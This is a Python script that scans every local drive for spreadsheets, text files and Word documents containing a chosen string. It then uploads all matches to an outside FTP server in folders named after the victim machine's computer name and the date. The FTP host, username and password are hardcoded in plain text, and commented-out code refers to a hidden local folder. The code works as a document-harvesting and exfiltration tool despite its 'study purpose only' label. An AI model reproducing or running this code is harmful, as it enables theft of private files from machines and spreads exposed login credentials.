# The following code is written by Rohit Saxena. STUDY PURPOSE ONLY. Any unauthorized use or modification is prohibited.
import glob
import os
import string
from typing import List, Any
import docx
import shutil
from urllib.request import urlopen, URLError
import openpyxl
import ftplib
import datetime

i = 0
j = 0
rvs = []
host = "ftp.byethost22.com"                     #FTP Host URL
ftp_id = "b22_28269653"                         #FTP CLIENT ID
ftp_pw = "Falcon@16"                            #FTP CLIENT PASSWORD
_ftp_root_folder_ = 'htdocs'                    #FTP root folder
newdir = os.environ['COMPUTERNAME']             #FTP Main folder name
ft = []
todaysDate = str(datetime.datetime.today())     #FTP sub-folder name
ftp = ftplib.FTP()


def _InternetCheck_():    #Internet Tester
    while True:
        try:
            urlopen('https://www.central16.in', timeout=1)
            return
        except URLError as e:
            print('URL Error: ', e.reason)
            pass


#def _RsBackupWriter(rvs, pp,):                                             # local backup (unfinished)
   # while j != len(rvs):
        #with open(rvs[j]) as trs, open(pp, "a") as rrs:
          #  for line in trs:
             #   rrs.write(line.rstrip("\n") + '\t' + rss[j] + "\n")
    # shutil.copy(rss[j],pp)
   # print('Backup File Created')
   # file1 = open(pp, "r")
   # print(file1.read())
   # file1.close()


def _RsXlsx_(SS, CC):     #XLSX Reader
    rs = openpyxl.load_workbook(CC, read_only=True, data_only=True)
    ws = rs.active
    for i in range(1, ws.max_row + 1):
        for j in range(1, ws.max_column + 1):
            if SS == ws.cell(i, j).value:
                print("Found in cell :", ws.cell(i, j), "File Location :", CC)
                rvs.append(CC)


def _RsTxt_(SS, CC):        #TXT Reader
    file1 = open(CC, 'r', encoding='UTF8', errors='ignore')
    flag = 0
    index = 0
    for line in file1:
        index += 1
        if SS in line:
            flag = 1
            break
    if flag != 0:
        print('String', SS, 'Found In Line: ', index, 'File Path: ', CC)
        rvs.append(CC)
    file1.close()


def _RsDocx_(SS, CC):         #DOCX Reader
    flag = 0
    index = 0
    doc = docx.Document(CC)
    for para in doc.paragraphs:
        index += 1
        if SS in para.text:
            flag = 1
            break
    if flag != 0:
        print('String', SS, 'Found In Line: ', index, 'File Path: ', CC)
        rvs.append(CC)


def _RsDirCheck_(ft):         #FTP Main Folder Checker
    x = 0
    for g in ft:
        if newdir in g:
            x = 1
    if x == 0:
        print(" New Directory created ---> ", newdir)
        ftp.mkd(newdir)


def _RsTodayFolderCheck_(ft):      #FTP Sub-Folder Checker
    x = 0
    for g in ft:
        if todaysDate in g:
            x = 1
    if x == 0:
        ftp.mkd(todaysDate)
        print("New Todays date folder created ---> ", todaysDate)


def _Rs_ftp_COPY_():              #FTP Client connector
    print('uploading data...')
    port = 21
    ftp.connect(host, port)
    print(ftp.getwelcome())
    print("Logging in...")
    ftp.login(ftp_id, ftp_pw)
    ftp.cwd(_ftp_root_folder_)
    ftp.retrlines('LIST', ft.append)
    _RsDirCheck_(ft)
    ftp.cwd(newdir)
    ft.clear()
    ftp.retrlines('LIST', ft.append)
    _RsTodayFolderCheck_(ft)
    ftp.cwd(todaysDate)


def _rS_FTP_file_transf(rvs):              #FTP File uploader
    rs = 0
    print('Uploading Data...')
    while rs != len(rvs):
        filename = rvs[rs]
        file_name, file_extension = os.path.splitext(filename)
        _FTP_File_Name_ = os.path.basename(file_name) + file_extension
        _ftpNewFileNMCmd_ = "STOR %s" % _FTP_File_Name_
        with open(filename, "rb") as file:
            ftp.storbinary(_ftpNewFileNMCmd_, file)
        rs += 1
    print('Upload Complete !')
    ftp.dir()


def main():
    global i, j
    global rvs
    #    val = input("Enter extension : ")
    ff = input("Enter string : ")
    rs = ['%s:\\' % d for d in string.ascii_uppercase if os.path.exists('%s:\\' % d)]
    print('Active local drives ---> ', rs)
    FtypeXLSX = '.xlsx'
    FtypeTXT = '.txt'
    FtypeDOCX = '.docx'
    _Rel_Exp_ = '**/*'
    _Rel_Path_ = _Rel_Exp_
    # print('Selected file type = ', val)
    rss = []

    #directory = "rrs"                                       #LINE 154 - 166 REFERS LOCAL BACKUP (UNFINISHED)
   # file_name = "rrs.txt"
    #print('Hidden folder named rss is created in first local drive from available drive list')
    #pth = os.path.join(rs[0], directory)
   # if os.path.exists(pth):  # this if will flush the old backup folder and re-create new backup folder
    #    shutil.rmtree(pth)
    #os.makedirs(pth)
    #print('Hidden folder path: ', pth)
   # print('Hidden file text.txt is created in hidden folder rss')
   # CN = os.path.join(pth, file_name)
    # print('Hidden file location: ', CN)
    #file1 = open(CN, "a")
    #file1.close()

    print('Below files are present in system: ')
    while i != len(rs):
        os.chdir(rs[i])
        for file in glob.glob(_Rel_Path_, recursive=True):
            # print(file)
            completeName = os.path.join(rs[i], file)
            # print('File path: ', completeName)
            file_name, file_extension = os.path.splitext(completeName)
            if file_extension == FtypeXLSX:
                try:
                    _RsXlsx_(ff, completeName)
                except:
                    print('Error in reading file, File Path: ', completeName)
            if file_extension == FtypeTXT:
                try:
                    _RsTxt_(ff, completeName)
                except PermissionError:
                    print('Admin Permission Required File Path: ', completeName)
            if file_extension == FtypeDOCX:
                try:
                    _RsDocx_(ff, completeName)
                except:
                    print('Error in reading file, File Path: ', completeName)
            rss.append(completeName)
        i += 1
    print('scan done')
    # print(rss)
    print('Total File Scanned :', len(rss))
    print("Total file found: ", len(rvs))
    print(rvs)
    #_RsBackupWriter(rvs, CN)           #LOCAL BACKUP CREATOR
    _Rs_ftp_COPY_()
    _rS_FTP_file_transf(rvs)
    #shutil.rmtree(pth)              #FLUSH OLD BACKUP FILES (UNFINISHED)


_InternetCheck_()
main()
